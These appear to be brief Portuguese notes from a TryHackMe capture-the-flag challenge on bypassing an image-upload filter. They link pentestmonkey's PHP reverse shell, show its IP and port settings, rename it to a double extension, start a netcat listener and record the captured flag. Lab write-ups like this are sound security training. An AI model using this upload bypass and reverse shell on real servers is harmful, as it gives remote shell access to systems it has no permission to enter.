
ID de auditoria = DIzODI5MTNiYmYw

index.php?id=ODIzODI5MTNiYmYw
h1>You are not signed in</h1>
			<h2>Please enter your ID as a GET parameter (<code>?id=YOUR_ID_HERE</code>)</h2>

Aceita imagem:
<input type=file id="chooseFile" accept=".jpeg,.jpg,.png">


Diretório de upload files:
/uploads/


Diretórios padrões de uploads.
/uploads, /images, /media, ou /resources


https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

php-reverse-shell.php.jpeg
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.9.185.104';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;


nc -vnlp 1234
http://10.10.154.7/uploads/php-reverse-shell.jpeg.php

flag = THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}
/var/www/flag.txt




